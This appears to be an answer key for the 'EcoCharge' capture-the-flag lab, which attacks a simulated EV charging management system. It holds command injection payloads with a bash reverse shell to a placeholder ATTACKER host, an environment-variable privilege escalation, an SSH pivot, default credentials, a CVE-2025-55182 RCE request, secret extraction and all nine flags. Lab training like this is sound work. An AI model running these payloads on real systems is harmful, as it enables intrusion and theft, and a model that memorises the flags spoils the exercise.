# EcoCharge CTF - Attack Flow (Short Version)

## Scenario: From Command Injection to CSMS Compromise

**Version:** 4.0 | **Flags:** 9 | **Difficulty:** Medium-Hard

---

## Attack Chain Overview

```
┌─────────────┐     ┌─────────────┐     ┌─────────────┐     ┌─────────────┐
│   PHASE 1   │     │   PHASE 2   │     │   PHASE 3   │     │   PHASE 4   │
│   Initial   │────►│   Lateral   │────►│   Recon     │────►│    CSMS     │
│   Access    │     │   Movement  │     │             │     │  Compromise │
└─────────────┘     └─────────────┘     └─────────────┘     └─────────────┘
  Web Server          DMZ Zone           Grafana           CVE-2025-55182
  Cmd Injection       SSH Pivot          Default Creds     React2Shell RCE
  FLAGS: 1,2,3        FLAGS: 4,5         FLAG: 6           FLAGS: 7,8,9
```

---

## Phase 1: Initial Access (Web Server)

**Target:** 192.168.250.50 | **Vulnerability:** CWE-78 Command Injection

```bash
# Discovery: Invalid format reveals debug info
curl "http://192.168.250.50/api/qr?station=EV-CH-001&format=pdf"

# Exploitation: Command injection via station parameter
curl "http://192.168.250.50/api/qr?station=EV-CH-001;id&format=png"

# Reverse shell
curl "http://192.168.250.50/api/qr?station=;bash+-c+'bash+-i+>%26+/dev/tcp/ATTACKER/4444+0>%261'&format=png"
```

**FLAG #1:** `FLAG{qr_c0mm4nd_1nj3ct10n}` — Command Injection RCE

**PrivEsc via backup.js:**
```bash
export BACKUP_TARGET="; bash -p"
sudo /usr/bin/node /opt/maintenance/backup.js
```

**FLAG #2:** `FLAG{pr1v3sc_b4ckup_sh3ll}` — Privilege Escalation  
**FLAG #3:** `FLAG{cr3d5_1n_3nv_f1l3}` — Credentials in .env

---

## Phase 2: Lateral Movement (DMZ)

**API Gateway Info Disclosure:**
```bash
curl -H "X-API-Key: ec0ch4rg3_4p1_k3y_2024!" \
     "http://192.168.100.20:8080/api/v1/internal/config"
```

**FLAG #4:** `FLAG{4p1_1nf0_d1scl0sur3}`

**SSH Pivot to Jump Host:**
```bash
ssh -i id_jumphost operator@192.168.100.40
```

**FLAG #5:** `FLAG{jump_h0st_p1v0t}`

---

## Phase 3: Internal Reconnaissance

**Grafana Access (via SSH tunnel):**
```bash
ssh -L 3000:192.168.100.30:3000 operator@192.168.100.40 -N &
# Login: admin / admin
```

**FLAG #6:** `FLAG{gr4f4n4_d3f4ult_cr3ds}`

---

## Phase 4: CSMS Compromise (CVE-2025-55182)

**Target:** 192.168.20.20 | **Vulnerability:** React2Shell RCE

```bash
# CVE-2025-55182 exploitation
curl -X POST http://192.168.20.20:3000/api/action \
     -H "Content-Type: text/x-component" \
     -H "Next-Action: exploit" \
     -d '{"payload":{"$$bound":[{"$type":"Function","body":"return require(\"child_process\").execSync(\"id\").toString()"}]}}'
```

**FLAG #7:** `FLAG{r34ct2sh3ll_csms_pwn3d}` — RCE on CSMS

**Environment extraction:**
```bash
# Read /proc/1/environ → HASURA_ADMIN_SECRET=CitrineOS!
```

**FLAG #8:** `FLAG{h4sur4_s3cr3t_l34k3d}`

**Database compromise via GraphQL:**
```bash
curl -X POST http://192.168.20.20:8090/v1/graphql \
     -H "X-Hasura-Admin-Secret: CitrineOS!" \
     -d '{"query":"{ ctf_flags { flag_value } }"}'
```

**FLAG #9:** `FLAG{full_csms_c0mpr0m1s3}` — **FINAL FLAG**

---

## Flags Summary

| # | Flag | Method |
|---|------|--------|
| 1 | `FLAG{qr_c0mm4nd_1nj3ct10n}` | Command Injection |
| 2 | `FLAG{pr1v3sc_b4ckup_sh3ll}` | PrivEsc |
| 3 | `FLAG{cr3d5_1n_3nv_f1l3}` | Credential Leak |
| 4 | `FLAG{4p1_1nf0_d1scl0sur3}` | API Info Disclosure |
| 5 | `FLAG{jump_h0st_p1v0t}` | SSH Pivot |
| 6 | `FLAG{gr4f4n4_d3f4ult_cr3ds}` | Default Creds |
| 7 | `FLAG{r34ct2sh3ll_csms_pwn3d}` | CVE-2025-55182 |
| 8 | `FLAG{h4sur4_s3cr3t_l34k3d}` | Env Leak |
| 9 | `FLAG{full_csms_c0mpr0m1s3}` | DB Compromise |

---

**Version:** 4.0 | **Last Updated:** February 2025
